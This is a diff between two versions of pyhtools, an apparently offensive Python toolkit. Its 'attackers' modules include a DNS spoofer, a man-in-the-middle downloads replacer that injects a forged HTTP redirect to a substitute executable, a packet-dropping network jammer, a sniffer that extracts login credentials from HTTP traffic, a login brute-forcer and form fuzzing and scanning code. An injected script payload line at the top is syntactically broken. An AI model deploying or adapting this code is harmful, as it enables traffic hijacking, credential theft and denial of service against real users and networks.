+    except KeyboardInterrupt:
+        print(BRIGHT_RED + '\r[-] Keyboard Interrupt detected!')
 
-except KeyboardInterrupt:
-    print(BRIGHT_RED + '\r[-] Keyboard Interrupt detected!')
+    except Exception:
+        print(BRIGHT_RED + '[-] An Exception occurred while creating queue.\n', Exception)
 
-except Exception:
-    print(BRIGHT_RED + '[-] An Exception occurred while creating queue.\n', Exception)
+    finally:
+        print(BRIGHT_YELLOW + '[*] Restoring previous configurations.. please be patient...')
+        reset_config()
 
-finally:
-    print(BRIGHT_YELLOW + '[*] Restoring previous configurations.. please be patient...')
-    reset_config()
+        print(BRIGHT_RED + '[-] Program stopped.')
 
-    print(BRIGHT_RED + '[-] Program stopped.')
+if __name__ == '__main__':
+    inj_code:str='<script>alert("Payload Added!!")</script>')
+    run()
```

### Comparing `pyhtools-2.2.2/pyhtools/attackers/Network/dnsspoofer.py` & `pyhtools-2.2.3/pyhtools/attackers/Network/dnsspoofer.py`

 * *Files 9% similar despite different names*

```diff
@@ -1,9 +1,7 @@
-#!usr/bin/env python
-
 #########################################################################
 # Author : Dhrumil Mistry
 #########################################################################
 
 
 #########################################################################
 # If you encounter Import error after installing netfilter use command 
@@ -15,19 +13,24 @@
 import netfilterqueue
 import scapy.all as scapy
 
 
 SPOOF_WEBSITE = b'www.bing.com'
 SPOOF_RDATA = b'10.0.2.15'
 
-############################### Functions ############################### 
+
 def forward_packets():
-    '''
-    configures the mitm for incoming request packets
-    into a queue.
+    '''configures the mitm for incoming request packets
+    into a queue
+
+    Args:
+        None
+
+    Returns:
+        None
     '''
 
     # executing the following command
     # iptables -I FOWARD -j NFQUEUE --queue-num (any number)
     # sudo iptables -I FORWARD -j NFQUEUE --queue-num 0
     # -I -> insert (packet into a chain specified by the user)
     # -j -> jump if the packet matches the target.
@@ -39,25 +42,37 @@
     call('sudo iptables -I OUTPUT -j NFQUEUE --queue-num 0', shell=True)
 
 
 
 def reset_config():
     '''
     resets the configurations changed while exectution of the program to 
-    its original configuration.
+    its original configuration
+
+    Args:
+        None
+
+    Returns:
+        None
     '''
     call('sudo iptables --flush', shell=True)
 
 
 
 def process_packet(packet):
     '''
     process received packet, everytime a packet is received.
     prints the packet received in the queue and it changes 
-    the DNS response dest ip with your desired ip.
+    the DNS response dest ip with your desired ip
+
+    Args:
+        packet (scapy.IP): IP packet from netfilterqueue/iptables 
+
+    Returns:
+        None
     '''
     scapy_pkt = scapy.IP(packet.get_payload())
 
     # Check for DNS layer in DNS Request Record (DNSRR) or 
     # DNS Question Record (DNSQR)
     if scapy_pkt.haslayer(scapy.DNSRR):
         qname = scapy_pkt[scapy.DNSQR].qname
@@ -77,36 +92,47 @@
 
             packet.set_payload(bytes(scapy_pkt))
             print(packet)
 
     packet.accept()
 
 
-############################### Main ############################### 
+def run():
+    '''Starts DNS spoofer
+
+    Args:
+        None
+
+    Returns:
+        None
+    '''
+    print('[*] configuring packet receiver...')
+
+    forward_packets()
+    print('[*] packet receiver configured successfully.\n')
 
-print('[*] configuring packet receiver...')
+    print('[*] Creating Queue to start receiving packets.')
+    try:
+        queue = netfilterqueue.NetfilterQueue()
+        # Bind queue with queue-number 0
+        queue.bind(0, process_packet)
+        queue.run()
 
-forward_packets()
-print('[*] packet receiver configured successfully.\n')
+    except OSError as e:
+        print('[-] Run script with root priviliges.')
+        print(e)
 
-print('[*] Creating Queue to start receiving packets.')
-try:
-    queue = netfilterqueue.NetfilterQueue()
-    # Bind queue with queue-number 0
-    queue.bind(0, process_packet)
-    queue.run()
+    except KeyboardInterrupt:
+        print('\r[-] Keyboard Interrupt detected!')
 
-except OSError as e:
-    print('[-] Run script with root priviliges.')
-    print(e)
+    except Exception:
+        print('[-] An Exception occurred while creating queue.\n', Exception)
 
-except KeyboardInterrupt:
-    print('\r[-] Keyboard Interrupt detected!')
+    finally:
+        print('[*] Restoring previous configurations.. please be patient...')
+        reset_config()
 
-except Exception:
-    print('[-] An Exception occurred while creating queue.\n', Exception)
+        print('[-] Program stopped.')
 
-finally:
-    print('[*] Restoring previous configurations.. please be patient...')
-    reset_config()
 
-    print('[-] Program stopped.')
+if __name__ == '__main__':
+    run()
```

### Comparing `pyhtools-2.2.2/pyhtools/attackers/Network/downloads_replacer.py` & `pyhtools-2.2.3/pyhtools/attackers/Network/downloads_replacer.py`

 * *Files 12% similar despite different names*

```diff
@@ -1,9 +1,7 @@
-#!usr/bin/env python
-
 #########################################################################
 # Author : Dhrumil Mistry
 #########################################################################
 
 
 #########################################################################
 # If you encounter Import error after installing netfilter use command 
@@ -34,19 +32,24 @@
 import scapy.all as scapy
 
 
 # REDIRECT = b'https://referrals.brave.com/latest/BraveBrowserSetup.exe'
 # REDIRECT = b'10.0.2.15/redirect.exe'
 
 
-############################### Functions ############################### 
 def forward_packets():
     '''
     configures the mitm for incoming request packets
     into a queue.
+
+    Args:
+        None
+
+    Returns:
+        None
     '''
 
     # executing the following command
     # iptables -I FOWARD -j NFQUEUE --queue-num (any number)
     # sudo iptables -I FORWARD -j NFQUEUE --queue-num 0
     # -I -> insert (packet into a chain specified by the user)
     # -j -> jump if the packet matches the target.
@@ -58,22 +61,37 @@
     # call('sudo iptables -I OUTPUT -j NFQUEUE --queue-num 0', shell=True)
     
 
 
 def reset_config():
     '''
     resets the configurations changed while exectution of the program to 
-    its original configuration.
+    its original configuration
+
+    Args:
+        None
+
+    Returns:
+        None
     '''
     call('sudo iptables --flush', shell=True)
 
 
 ack_list = []
 
 def set_load(packet, load):
+    '''sets the packet raw layer load value to the passed load value
+
+    Args:
+        packet (scapy.IP): scapy IP packet
+        load (bytes): payload data as bytes
+
+    Returns:
+        scapy.IP: returns packet with load
+    '''
     packet[scapy.Raw].load = load
 
     # since now the packet has been tampered, the new 
     # packet will have differet length and checksums
     # so we'll delete these fields and scapy will 
     # automatically calulate these for us.
     del packet[scapy.IP].len
@@ -83,14 +101,20 @@
     return packet
 
 def process_packet(packet):
     '''
     process received packet, everytime a packet is received.
     prints the packet received in the queue and it changes 
     the DNS response dest ip with your desired ip.
+
+    Args:
+        packet (scapy.IP): packet from netfilterqueue/iptables
+
+    Returns:
+        None
     '''
     scapy_pkt = scapy.IP(packet.get_payload())
 
     # HTTP layer is in the Raw layer.
     # if dport (destination port) = http (i.e. port 80) in TCP and raw layer 
     # consists of get method then, packet consists a HTTP request.
     # 
@@ -111,36 +135,47 @@
                 
                 modified_pkt = set_load(scapy_pkt, "HTTP/1.1 301 Moved Permanently\nLocation: https://referrals.brave.com/latest/BraveBrowserSetup.exe \n\n")
                 packet.set_payload(bytes(modified_pkt))
         
     packet.accept()
     
 
-############################### Main ############################### 
+def run():
+    '''Starts download replacer
+    
+    Args:
+        None
+
+    Returns:
+        None
+    '''
+    print('[*] configuring packet receiver...')
+
+    forward_packets()
+    print('[*] packet receiver configured successfully.\n')
 
-print('[*] configuring packet receiver...')
+    print('[*] Creating Queue to start receiving packets.')
+    try:
+        queue = netfilterqueue.NetfilterQueue()
+        # Bind queue with queue-number 0
+        queue.bind(0, process_packet)
+        queue.run()
 
-forward_packets()
-print('[*] packet receiver configured successfully.\n')
+    except OSError as e:
+        print('[-] Run script with root priviliges.')
+        print(e)
 
-print('[*] Creating Queue to start receiving packets.')
-try:
-    queue = netfilterqueue.NetfilterQueue()
-    # Bind queue with queue-number 0
-    queue.bind(0, process_packet)
-    queue.run()
+    except KeyboardInterrupt:
+        print('\r[-] Keyboard Interrupt detected!')
 
-except OSError as e:
-    print('[-] Run script with root priviliges.')
-    print(e)
+    except Exception:
+        print('[-] An Exception occurred while creating queue.\n', Exception)
 
-except KeyboardInterrupt:
-    print('\r[-] Keyboard Interrupt detected!')
+    finally:
+        print('[*] Restoring previous configurations.. please be patient...')
+        reset_config()
 
-except Exception:
-    print('[-] An Exception occurred while creating queue.\n', Exception)
+        print('[-] Program stopped.')
 
-finally:
-    print('[*] Restoring previous configurations.. please be patient...')
-    reset_config()
 
-    print('[-] Program stopped.')
+if __name__ == '__main__':
+    run()
```

### Comparing `pyhtools-2.2.2/pyhtools/attackers/Network/network_jammer.py` & `pyhtools-2.2.3/pyhtools/attackers/Network/network_jammer.py`

 * *Files 20% similar despite different names*

```diff
@@ -1,9 +1,7 @@
-#!usr/bin/env python
-
 #########################################################################
 # Author : Dhrumil Mistry
 #########################################################################
 
 
 #########################################################################
 # If you encounter Import error after installing netfilter use command 
@@ -15,61 +13,90 @@
 import netfilterqueue
 
 ############################### Functions ############################### 
 def forward_packets():
     '''
     configures the mitm for incoming request packets
     into a queue.
+
+    Args:
+        None
+
+    Returns: 
+        None
     '''
 
     # executing the following command
     # iptables -I FOWARD -j NFQUEUE --queue-num (any number)
     # sudo iptables -I FORWARD -j NFQUEUE --queue-num 0
     # -I -> insert (packet into a chain specified by the user)
     # -j -> jump if the packet matches the target.
     # --queue-num -> jump to specfic queue number
     call('sudo iptables -I FORWARD -j NFQUEUE --queue-num 0', shell=True)
 
 
 def reset_config():
     '''
     resets the configurations changed while exectution of the program to 
-    its original configuration.
+    its original configuration
+
+    Args:
+        None
+
+    Returns: 
+        None
     '''
     call('sudo iptables --flush', shell=True)
 
 
 def process_packet(packet):
     '''
     process received packet, everytime a packet is received.
-    prints the packet received in the queue.
+    prints the packet received in the queue and drops packet
+
+    Args:
+        packet (scapy.IP): IP packet from netfiterqueue/iptables 
+
+    Returns: 
+        None
     '''
     print(packet)
     packet.drop()
     
 
-############################### Main ############################### 
+def run():
+    '''Start network jammer
+
+    Args:
+        None
+
+    Returns:
+        None
+    '''
+    print('[*] configuring packet receiver...')
+
+    forward_packets()
+    print('[*] packet receiver configured successfully.\n')
 
-print('[*] configuring packet receiver...')
+    print('[*] Creating Queue to start receiving packets.')
+    try:
+        queue = netfilterqueue.NetfilterQueue()
+    # Bind queue with queue-number 0
+        queue.bind(0, process_packet)
+        queue.run()
 
-forward_packets()
-print('[*] packet receiver configured successfully.\n')
+    except OSError as e:
+        print('[-] Run script with root priviliges.')
+        print(e)
 
-print('[*] Creating Queue to start receiving packets.')
-try:
-    queue = netfilterqueue.NetfilterQueue()
-   # Bind queue with queue-number 0
-    queue.bind(0, process_packet)
-    queue.run()
+    except Exception:
+        print('[-] An Exception occurred while creating queue.\n', Exception)
 
-except OSError as e:
-    print('[-] Run script with root priviliges.')
-    print(e)
+    finally:
+        print('[*] Restoring previous configurations.. please be patient...')
+        reset_config()
 
-except Exception:
-    print('[-] An Exception occurred while creating queue.\n', Exception)
+        print('[-] Program stopped.')
 
-finally:
-    print('[*] Restoring previous configurations.. please be patient...')
-    reset_config()
 
-    print('[-] Program stopped.')
+if __name__ == '__main__':
+    run()
```

### Comparing `pyhtools-2.2.2/pyhtools/attackers/Network/nwscan.py` & `pyhtools-2.2.3/pyhtools/attackers/Network/nwscan.py`

 * *Files 10% similar despite different names*

```diff
@@ -2,31 +2,37 @@
 
 
 import scapy.all as sp
 import argparse
 
 
 def get_args():
-    '''
-    description: get arguments from the command line.
-    params: None
-    returns: str
+    '''get arguments from the command line.
+    
+    Args:
+        None
+
+    Returns: 
+        str: IP address/range
     '''
     parser = argparse.ArgumentParser(description='search for other devices on the network')
     parser.add_argument('-ip', help='ip or ip range of the target device')
     args = parser.parse_args()
 
     return args.ip
 
 
 def scan(ip):
-    '''
-    description: scans ip range for clients and returns discovered clients list.
-    params: ip (str)
-    returns: clients (list)
+    '''scans ip range for clients and returns discovered clients list.
+    
+    Args: 
+        ip (str): IP address/range of client to be discovered
+
+    Returns: 
+        list: IP addresses of discovered network clients  
     '''
     print(BRIGHT_WHITE + f'[*] Discovering Clients {ip}')
     arp_req = sp.ARP(pdst=ip)
     brdcst = sp.Ether(dst='ff:ff:ff:ff:ff:ff')
     packet = brdcst / arp_req
     responded_list = sp.srp(packet, timeout=2, retry=3,verbose=False)[0]
 
@@ -34,34 +40,40 @@
     for ele in responded_list:
         clients.append({"ip": ele[1].psrc, 'mac': ele[1].hwsrc})
 
     return clients
 
 
 def print_clients(clients):
-    '''
-    description: prints discovered clients on the network ip range.
-    params: clients(list)
-    returns: None
+    '''prints discovered clients on the network ip range.
+    
+    Args: 
+        clients (list): list of discovered ip addresses
+
+    Returns: 
+        None
     '''
     print(BRIGHT_YELLOW + '________________________________________________________')
     print(BRIGHT_YELLOW + 'IP\t\t\tMAC Address')
     print(BRIGHT_YELLOW + '--------------------------------------------------------')
 
     for client in clients:
         print( BRIGHT_WHITE + client.get('ip') + '\t\t' + client.get('mac'))
     
     print(BRIGHT_YELLOW + '________________________________________________________\n')
     
 
 def run_nwscan(ip:str):
-    '''
-    description: starts network scanner for specified ip range or ip.
-    params: IP (str)
-    returns: None
+    '''starts network scanner for specified ip range or ip.
+    
+    Args: 
+        ip (str): IP address/range of scan target
+
+    Returns: 
+        None
     '''
     try:
         print(BRIGHT_YELLOW + '[*] Starting Network Scanner....')
         clients = scan(ip)
         print_clients(clients)
     except Exception as e:
         print(BRIGHT_RED + '[-] Exception : ', e)
```

### Comparing `pyhtools-2.2.2/pyhtools/attackers/Network/pkt_sniffer.py` & `pyhtools-2.2.3/pyhtools/attackers/Network/pkt_sniffer.py`

 * *Files 25% similar despite different names*

```diff
@@ -2,83 +2,101 @@
 from scapy.layers import http
 import argparse
 from sys import exit
 from pyhtools.UI.colors import *
 
 
 def get_args():
-	'''
-	description: get arguments from the command line.
-	params: None
-	returns: interface(str) 
+	'''get arguments from the command line.
+	
+	Args:
+		None
+	
+	Returns: 
+		str: network interface
 	'''
 	parser = argparse.ArgumentParser(description='Packet Sniffer')
 	parser.add_argument('-i', '--interface', dest='interface', help='choose interface')
 	args = parser.parse_args()
 
 	interface = args.interface
 	
 	del parser
 	return interface
 
 
 def check_args(intrfce):
-	'''
-	description: checks if the passed arguments are valid. if valid returns True.
-	params: intrfce(str)
-	returns: bool
+	'''checks if the passed arguments are valid. if valid returns True.
+	
+	Args:
+		intrfce (str): network inferface on which sniffing action is be performed
+
+	Returns: 
+		bool: returns True if args are valid else False
 	'''
 	if not intrfce:
 		exit(BRIGHT_RED + "[-] Please enter interface argument, use -h or --help for more info")
 	return True
 
 
 def get_url(packet):
-	'''
-	description: extract url from the packet.
-	params: packet
-	returns: url(str)
+	'''extract url from the packet
+
+	Args: 
+		packet (scapy.IP): scapy packet
+
+	Returns: 
+		str: URL inside the HTTP packet
 	'''
 	print('IN GET URL')
 	return str(packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path, encoding='utf-8')
 
 
 def get_login_info(packet):
-	'''
-	description: extract login information from the sniffed packet.
-	params: packet
-	returns: url with login information
+	'''extract login information from the sniffed packet.
+	
+	Args: 
+		packet (scapy.IP): scapy packet
+
+	Returns: 
+		str: URL with login information
 	'''
 	if packet.haslayer(sp.Raw):
 			load = str(packet[sp.Raw].load,encoding='utf-8')
 			keywords = ["username", "user", "password", "pass", "login"]
 			for keyword in keywords:
 				if keyword in load:
 					return load
 
 
 def sniffer(intrfce, args_status):
-	'''
-	description: sniffs packets over the network.
-	params: intrfce, args_status
-	returns: None
+	'''sniffs packets over the network.
+	Args: 
+		intrfce (str): network interface for sniffing action
+		args_status (bool): True if cli args are valid else False
+
+	Returns: 
+		None
 	'''
 	try:
 		if args_status:
 			sp.sniff(iface=intrfce, store=False, prn=process_sniffed_pkt)
 	except Exception as e:
 		print(BRIGHT_RED + '[-] An error occured while sniffing...')
 		print(e)
 
 
 def process_sniffed_pkt(packet):
-	'''
-	description: analyzes the captured packet for login information.
-	params: packet
-	returns: None
+	'''analyze the captured packet for login information.
+	
+	Args: 
+		packet (scapy.IP): scapy packet
+
+	Returns: 
+		None
 	'''
 	if packet.haslayer(http.HTTPRequest):
 		
 		url = get_url(packet)
 		print(BRIGHT_WHITE + '[+] Http Request >> ' + url + '\n')
 
 		login_info = get_login_info(packet)
```

### Comparing `pyhtools-2.2.2/pyhtools/attackers/attackers.py` & `pyhtools-2.2.3/pyhtools/attackers/attackers.py`

 * *Files identical despite different names*

### Comparing `pyhtools-2.2.2/pyhtools/attackers/web/api/discover.py` & `pyhtools-2.2.3/pyhtools/attackers/web/api/discover.py`

 * *Files 24% similar despite different names*

```diff
@@ -15,32 +15,52 @@
 
 aiohttp.resolver.DefaultResolver = aiohttp.resolver.AsyncResolver
 if os_name == 'nt':
     asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())
 
 
 class APIdiscover:
+    '''
+    Class to discover API endpoints
+    '''
     def __init__(self, base_url: str, match_codes: list[int], rate_limit: int = 20, delay: float = 0.05, output_file_path: str = None, headers: dict = None) -> None:
+        '''APIdiscover constructor
+    
+        Args:
+            base_url (str): weburl of API  
+            match_codes (list): list of integer containing HTTP response status codes, which detects that endpoint exists
+            rate_limit (int): number of concurrent requests at the same time
+            delay (float): delay between consecutive requests
+            output_file_path (str): file path to store results in json format
+            headers (dict): overrides default headers while sending HTTP requests
+
+        Returns:
+            None
+        '''
         assert isinstance(base_url, str)
         assert isinstance(match_codes, list)
         assert isinstance(rate_limit, int)
         assert isinstance(delay, float)
 
         self.base_url = base_url
         self.output_file_path = output_file_path
         self.match_codes = match_codes
         self._delay = delay
         self._semaphore = asyncio.Semaphore(rate_limit)
         self._headers = headers
 
-    async def check_endpoint(self, endpoint: str):
-        '''
-        description: checks if endpoint is valid or not, returns dict containing endpoint information
-        args: endpoint(str): api endpoint
-        returns: dict or None
+    async def check_endpoint(self, endpoint: str) -> dict:
+        '''checks if endpoint is valid or not using HTTP Get request
+        returns dict containing endpoint information
+        
+        Args: 
+            endpoint(str): api endpoint
+
+        Returns: 
+            dict: contains HTTP request and response data
         '''
         assert isinstance(endpoint, str)
 
         url = urljoin(self.base_url, endpoint)
         async with self._semaphore:
             async with ClientSession(headers=self._headers) as session:
                 async with session.get(url) as response:
@@ -58,28 +78,40 @@
                         "req_headers": dict(**response.request_info.headers),
                         "res_redirection": str(response.history),
                         "res_headers": dict(response.headers),
                         "res_body": (await response.read()).decode('utf-8'),
                     }
 
     async def get_endpoints_from_file(self, wordlist_path: str):
-        '''
-        reads endpoints from wordlist file and returns as a list
+        '''reads endpoints from wordlist file and returns as a list
+
+        Args:
+            wordlist_path (str): path of wordlist file
+        
+        Returns:
+            list: list of str containing endpoints
         '''
         assert isinstance(wordlist_path, str) and isfile(wordlist_path)
 
         endpoints = None
         with open(wordlist_path, 'r') as f:
             endpoints = [str(endpoint).strip() for endpoint in f.readlines()]
 
         return endpoints
 
     async def save_result_to_file(self, results: list[dict], file_path: str,):
-        '''
-        stores json result to file
+        '''stores json result to file
+
+        Args:
+            file_path (str): path to output file
+            results (list): list of HTTP response (dict) 
+        
+        Returns:
+            bool: returns True if file was saved else False in case 
+            of any exception
         '''
         assert isinstance(results, list)
         assert isinstance(file_path, str)
 
         save_status = False
         with open(file_path, 'w') as f:
             try:
@@ -91,28 +123,41 @@
                     f'Invalid json data, Failed to store data in {file_path}')
 
         return save_status
 
     async def start_enum_from_file(self, wordlist_file: str):
         '''
         start endpoint enumeration using wordlist
+
+        Args:
+            wordlist_file(str): path of wordlist file
+        
+        Returns:
+            None
         '''
         endpoints = await self.get_endpoints_from_file(wordlist_file)
 
         results = await self.enumerate(endpoints=endpoints)
 
         if self.output_file_path:
             await self.save_result_to_file(
                 results=results,
                 file_path=self.output_file_path,
             )
 
     async def start_enum_id(self, ending_id: int, param_name: str, starting_id: int = 0):
-        '''
-        starts enumeration based on id in GET request
+        '''starts enumeration based on id in GET request
+
+        Args:
+            ending_id (int): object id after which enumeration should stop
+            param_name (str): GET param
+            starting_id (int): object id from which enumeration should start
+
+        Returns:
+            None
         '''
         assert isinstance(starting_id, int)
         assert isinstance(ending_id, int)
         assert isinstance(param_name, str)
 
         endpoints = [f'{self.base_url}{param_name}={id_val}' for id_val in range(starting_id, ending_id)]
 
@@ -121,16 +166,22 @@
         if self.output_file_path:
             await self.save_result_to_file(
                 results=results,
                 file_path=self.output_file_path,
             )
 
     async def enumerate(self, endpoints: list):
-        '''
-        start API enumeration and return captured responses as list
+        '''start API enumeration and return captured responses as list
+
+        Args:
+            endpoints (list): contains list of endpoints as str
+
+        Returns:
+            results (list): list of results containing dict of 
+            endpoint information
         '''
         assert isinstance(endpoints, list)
 
         tasks = []
         for endpoint in endpoints:
             tasks.append(
                 asyncio.ensure_future(
```

### Comparing `pyhtools-2.2.2/pyhtools/attackers/web/enumerate.py` & `pyhtools-2.2.3/pyhtools/attackers/web/enumerate.py`

 * *Files 26% similar despite different names*

```diff
@@ -15,25 +15,40 @@
     Discoverer can be used to enumerate directories and subdomains of target website.
     '''
 
     def __init__(self, *args, **kwargs) -> None:
         self._requester = AsyncRLRequests(*args, **kwargs)
 
     async def _filter_request(self, url: str, status_codes: list[int] = [200, 403, 500]):
-        '''
-        prints url if reponse status code matches code from status_codes.
+        '''prints url if reponse status code matches code from status_codes.
+        
+        Args:
+            url (str): URL of website   
+            status_codes (list): list of integer containing HTTP response  
+            status codes, which detects that directory/subdomain exists
+
+        Returns:
+            None
         '''
         response = await self._requester.request(url=url)
         
         if isinstance(response, dict) and response.get('status') in status_codes:
             print(url, response.get('status'))
 
     async def check_dirs(self, domain: str, wordlist_path: str, status_codes: list[int] = [200, 403, 500]):
-        '''
-        enumerate website directories
+        '''enumerate website directories
+
+        Args:
+            domain (str): domain of the target
+            wordlist_path (str): path of wordlist file
+            status_codes (list): list of integer containing HTTP response  
+            status codes, which detects that directory exists
+
+        Returns:
+            None
         '''
         if not domain.endswith('/'):
             domain += '/'
         if not domain.startswith('https://') or domain.startswith('http://'):
             domain = f'http://{domain}'
 
         dirs = read_file_lines(wordlist_path)
@@ -46,16 +61,24 @@
                     self._filter_request(link, status_codes)
                 )
             )
 
         await gather(*tasks)
 
     async def check_subdomains(self, domain: str, wordlist_path: str, status_codes: list[int] = [200, 403, 500]):
-        '''
-        enumerate website subdomains
+        '''enumerate website subdomains
+
+        Args:
+            domain (str): domain of the target
+            wordlist_path (str): path of wordlist file
+            status_codes (list): list of integer containing HTTP response  
+            status codes, which detects that directory exists
+
+        Returns:
+            None
         '''
         domain = domain.replace('https://', '').replace('http://', '')
         subdomains = read_file_lines(wordlist_path)
 
         tasks = []
         for subdomain in subdomains:
             url = f'http://{subdomain}.{domain}'
```

### Comparing `pyhtools-2.2.2/pyhtools/attackers/web/get_forms.py` & `pyhtools-2.2.3/pyhtools/attackers/web/get_forms.py`

 * *Files 10% similar despite different names*

```diff
@@ -1,38 +1,47 @@
 import requests
 from bs4 import BeautifulSoup
 from urllib.parse import urljoin
 
 # Beta Tool
 def remove_escape_seq(content:str)->str:
-    '''
-    desc: removes \r \t \n from the html parsed content if present.
-    params: content(str)
-    returns: str
+    '''removes \r \t \n from the html parsed content if present.
+    
+    Args: 
+        content (str): html content of webpage
+
+    Returns: 
+        str: returns escaped html code
     '''
     return content.replace(r'\n','').replace(r'\t','').replace(r'\r','')
 
 
 def get_page_content(url:str):
-    '''
-    desc: extracts html code of the webpage.
-    params: url(str)
-    returns: str
+    '''extracts html code of the webpage 
+    
+    Args: 
+        url (str): webpage URL
+
+    Returns: 
+        str: HTML content of the webpage
     '''
     response = requests.get(url)
     content = str(response.content)
     content = remove_escape_seq(content)
     return content
 
 
 def fuzz_forms(target_url:str):
-    '''
-    desc: get forms from html page, send post request and return html response 
-    params: target_url (str)
-    returns: str
+    '''get forms from html page, send post request and return html response 
+    
+    Args: 
+        target_url (str): webpage URL containing forms
+
+    Returns: 
+        str: returns html content of page after sending fuzzed form request
     '''
     page_content = get_page_content(target_url)
 
     # remove\r \t \n from the page content
     page_content = remove_escape_seq(page_content)
 
     page_html = BeautifulSoup(page_content,'html.parser')
```

### Comparing `pyhtools-2.2.2/pyhtools/attackers/web/login_guesser.py` & `pyhtools-2.2.3/pyhtools/attackers/web/login_guesser.py`

 * *Files 27% similar despite different names*

```diff
@@ -1,13 +1,23 @@
 import requests
 import os
 import sys
 from pyhtools.UI.colors import BRIGHT_YELLOW, BRIGHT_WHITE, BRIGHT_RED
 
 def bruteforce_login(target_url:str, wordlist_file:str, post_values:dict):
+    '''Bruteforces login requests on a website
+
+    Args:
+        target_url (str): URL of login page
+        wordlist_file (str): path of wordlist file
+        post_values (dict): dict containing key value pairs of POST data
+
+    Returns:
+        None
+    '''
     # tested on DVWA web app.
     # target_url = "http://10.0.2.30/dvwa/login.php"
     # wordlist_file = "full_path_to_wordlist"
     # post_values = {"username":"admin", "password":"", "Login":"submit"}
 
     if os.path.isfile(wordlist_file):
         print(BRIGHT_WHITE + '[*] Wordlist File Found! Starting Bruteforce Attack!!')
```

### Comparing `pyhtools-2.2.2/pyhtools/attackers/web/spider.py` & `pyhtools-2.2.3/pyhtools/attackers/web/spider.py`

 * *Files 11% similar despite different names*

```diff
@@ -1,25 +1,42 @@
 from bs4 import BeautifulSoup
 from html import unescape
 from urllib.parse import urljoin
 from .utils import AsyncRLRequests
 
 
 class Spider:
+    '''
+    class Spider used to extract links from website's webpage
+    '''
     def __init__(self, rate_limit:int=100, delay:int=0.0001, headers:dict=None) -> None:
+        '''
+        Spider constructor
+
+        Args:
+            rate_limit (int): number of concurrent requests at the same time 
+            delay (float): delay between consecutive requests 
+            headers (dict): overrides default headers while sending HTTP requests 
+
+        Returns:
+            None
+        '''
         # list to save links on the whole webpage
         # to avoid repetition
         self.target_links = set()
         self._client = AsyncRLRequests(rate_limit=rate_limit, delay=delay, headers=headers)
 
     async def get_links(self, url: str) -> set:
-        '''
-        description: extracts links from the whole webpage.
-        params: url(str) of the webpage
-        returns: links(list) present in the webpage
+        '''extracts links from the whole webpage
+
+        Args: 
+            url (str): URL of the webpage
+
+        Returns: 
+            list: list of links present in the webpage
         '''
         response = await self._client.request(url=url)
         html = response.get('res_body')
         if html is None:
             return set()
         
         soup = BeautifulSoup(html, 'html.parser')
@@ -29,19 +46,22 @@
             href_link = link.get('href')
             if href_link:
                 href_links.add(href_link)
 
         return href_links
 
     async def get_target_links(self, url: str, print_link: bool = True):
-        '''
-        description: extracts useful links and prints them which are
-        only related to the target webpage.
-        params: links(list) from the target webpage
-        returns: useful links(list) related to target webpage
+        '''extracts useful links and prints them which are
+        only related to the target webpage
+
+        Args: 
+            links (list): list of all links from the target webpage
+
+        Returns:
+            list: returns useful links list related to target webpage
         '''
         # extract links from page
         links:set = await self.get_links(url)
 
         new_links = set()
         for link in links:
             link = urljoin(url, link)
@@ -55,16 +75,22 @@
 
                 if print_link:
                     print(link)
 
         return new_links
 
     async def start(self, target_url:str, print_links: bool = True):
-        '''
-        description: starts spider
+        '''starts spider
+
+        Args:
+            target_url (str): URL of the target website
+            print_links (bool): if True prints links found on console
+        
+        Returns:
+            list: list of links found by spider
         '''
         queue = [target_url]
         while queue:
             # extract a link from queue
             current_url = queue.pop(0)
 
             # continue if url is already visited
```

### Comparing `pyhtools-2.2.2/pyhtools/attackers/web/vuln_scanner/scanner.py` & `pyhtools-2.2.3/pyhtools/attackers/web/vuln_scanner/scanner.py`

 * *Files 18% similar despite different names*

```diff
@@ -2,43 +2,50 @@
 import re
 from urllib.parse import urljoin
 from bs4 import BeautifulSoup
 from pyhtools.UI.colors import BRIGHT_RED, BRIGHT_WHITE, BRIGHT_YELLOW
 
 
 class Scanner:
+    '''Scans for vulnerabilities in the website'''
     def __init__(self, url:str, ignore_links:list) -> None:
+
         self.target_url = url
         
         if ignore_links:
             self.ignore_links = ignore_links
         else:
             self.ignore_links = []
         
         self.session = requests.Session()
         self.target_links = []
 
 
     def get_links(self, url:str)->list:
-        '''
-        description: extracts links from the whole webpage.
-        params: url(str) of the webpage
-        returns: links(list) present in the webpage
+        '''extracts links from the whole webpage.
+        Args:
+            url (str): URL of the webpage
+        
+        Returns: 
+            links (list): list of URLs present in the webpage
         '''
         response = self.session.get(url)
         content = str(response.content)
         return re.findall(r'(?:href=")(.*?)"',content)
 
 
     def get_target_links(self, url:str):
-        '''
-        description: extracts useful links and prints them which are
+        '''extracts useful links and prints them which are
         only related to the target webpage.
-        params: links(list) from the target webpage
-        returns: useful links(list) related to target webpage
+
+        Args:
+            links (list):  list of links from the target webpage
+
+        Returns:
+            list: useful links as str related to target webpage
         '''
         links = self.get_links(url)
         for link in links:
             link = urljoin(url, link)
             
             if '#' in link:
                 link = link.split('#')[0]
@@ -47,51 +54,66 @@
                 self.target_links.append(link)
                 if requests.get(link).status_code==200:
                     print(link)
                 self.get_target_links(link)
     
 
     def remove_escape_seq(self, content:str)->str:
-        r'''
-        desc: removes \r \t \n from the html parsed content if present.
-        params: content(str)
-        returns: str
+        r'''removes \r \t \n from the html parsed content if present.
+        
+        Args: 
+            content (str): html page content as string
+
+        Returns: 
+            str: escaped html content without \r \t \n chars
         '''
         return content.replace(r'\n','').replace(r'\t','').replace(r'\r','').replace(r"\'","'")
 
 
     def get_page_content(self, url:str)->str:
-        '''
-        desc: extracts html code of the webpage.
-        params: url(str)
-        returns: str
+        '''extracts html code of the webpage
+
+        Args:
+            url (str): URL of the webpage
+
+        Returns:
+            str: Html content as string
         '''
         response = self.session.get(url)
         content = str(response.content)
         content = self.remove_escape_seq(content)
         return content
 
 
     def get_forms(self, url:str)->list:
-        '''
-        description: extracts all the forms on the url webpage.
-        params: url(str)
-        returns: forms(list)
+        '''extracts all the forms on the url 
+        webpage using beautiful soup 4
+        
+        Args:
+            url (str): URL of webpage
+
+        Returns: 
+            list: list of forms (bs4.element.ResultSet)
         ''' 
         page_content = self.get_page_content(url)
         page_content = self.remove_escape_seq(page_content)
         page_html = BeautifulSoup(page_content,'html.parser')
         return page_html.find_all(name='form')
 
 
     def submit_form(self, form, value, url):
-        '''
-        description: submits form with passed value to url passed
-        params: form, value, url
-        returns: contents of the reponse.
+        '''submits form with passed value to url passed
+        
+        Args: 
+            form (dict): webpage form from bs4.element.ResultSet
